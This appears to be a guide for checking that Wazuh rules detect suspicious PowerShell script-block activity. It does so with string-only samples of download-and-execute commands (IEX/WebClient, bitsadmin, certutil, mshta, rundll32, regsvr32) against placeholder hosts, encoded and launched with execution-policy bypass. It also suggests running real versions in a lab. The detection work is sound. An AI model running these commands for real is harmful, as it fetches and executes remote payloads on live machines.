# Real 4104 Endpoint Testing Guide

This guide helps you generate real PowerShell Event ID `4104` samples on a Windows endpoint so you can confirm that the Wazuh decoder and rules are working end to end.

Use an isolated test endpoint. The recommended method below is the safe simulation approach because it logs realistic suspicious content without actually launching the LOLBin or remote content.

## Before you test

Confirm these are already true:

- PowerShell Script Block Logging is enabled on the Windows endpoint.
- The Wazuh agent is sending `Microsoft-Windows-PowerShell/Operational`.
- The manager already has the decoder integration and the `110420` to `110444` rules.

Useful searches:

```text
win.system.eventID: 4104
```

```text
data.integration: powershell_decoder
```

## Recommended safe simulation method

The pattern below stores the suspicious command in a string and prints it. That means:

- a real `4104` ScriptBlock event is generated
- the decoder still sees the suspicious text after Base64 decoding
- no remote content is actually downloaded
- the LOLBin is not actually launched

### Helper: encode any PowerShell script as `-EncodedCommand`

Run this in a PowerShell console on the endpoint:

```powershell
$script = @'
$x = "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')"
Write-Host $x
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded
```

Expected Wazuh hits:

- `110420`
- `110431`
- `110432`
- `110439`

### Test `BITS` or `bitsadmin`

```powershell
$script = @'
$x = "bitsadmin.exe /transfer job https://example.invalid/payload.exe $env:TEMP\payload.exe"
Write-Host $x
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $encoded
```

Expected Wazuh hits:

- `110420`
- `110431`
- `110440`

### Test `certutil`

```powershell
$script = @'
$x = "certutil.exe -urlcache -split -f https://example.invalid/payload.bin $env:TEMP\payload.exe"
Write-Host $x
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $encoded
```

Expected Wazuh hits:

- `110420`
- `110431`
- `110441`

### Test `mshta`

```powershell
$script = @'
$x = "mshta.exe https://example.invalid/launch.hta"
Write-Host $x
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $encoded
```

Expected Wazuh hits:

- `110420`
- `110431`
- `110442`

### Test `rundll32`

```powershell
$script = @'
$x = "rundll32.exe C:\Users\Public\stage.dll,EntryPoint"
Write-Host $x
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $encoded
```

Expected Wazuh hits:

- `110420`
- `110431`
- `110443`

### Test `regsvr32`

```powershell
$script = @'
$x = "regsvr32.exe /s /n /u /i:https://example.invalid/file.sct scrobj.dll"
Write-Host $x
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $encoded
```

Expected Wazuh hits:

- `110420`
- `110431`
- `110444`

## Optional higher-fidelity lab execution

If you want to test closer to real operator behavior, do it only on an isolated lab endpoint. In that case, replace the string-only samples with actual commands. Use a controlled internal web server or a non-routable lab hostname that you own.

## Troubleshooting

### Avoid self-generated test noise

When validating from the Windows endpoint, avoid running local PowerShell search commands that contain the same suspicious strings you are testing, such as:

- `FromBase64String`
- sample Base64 blobs
- `IEX`, `Net.WebClient`, `bitsadmin`, `certutil`, `rundll32`, `regsvr32`, `mshta`

Those local validation commands can generate their own `4104` events and make the results look misleading.

Sa actual live testing, mas malinis ang pattern na ito:

- trigger the sample
- note the UTC time of the trigger
- validate from the manager by time window and rule ID

If you see the original `4104` event but no decoded alert:

- confirm the manager integration is enabled in `ossec.conf`
- confirm `/var/log/wazuh-powershell-decoded.json` is being written
- confirm the first-stage event matched rule `110420`

If you see decoded enrichment but not the expected high-confidence rule:

- inspect `data.decoded_script` in the alert
- compare the exact command text with the rule regex
- run the matching sample from the `samples` folder through `wazuh-logtest`

## Fast manager-side validation

On the Wazuh manager, you can validate each sample directly:

```bash
cat /path/to/decoded_iex_webclient.json | /var/ossec/bin/wazuh-logtest -l /var/log/wazuh-powershell-decoded.json
```

Repeat for:

- `decoded_bitsadmin.json`
- `decoded_certutil.json`
- `decoded_mshta.json`
- `decoded_rundll32.json`
- `decoded_regsvr32.json`
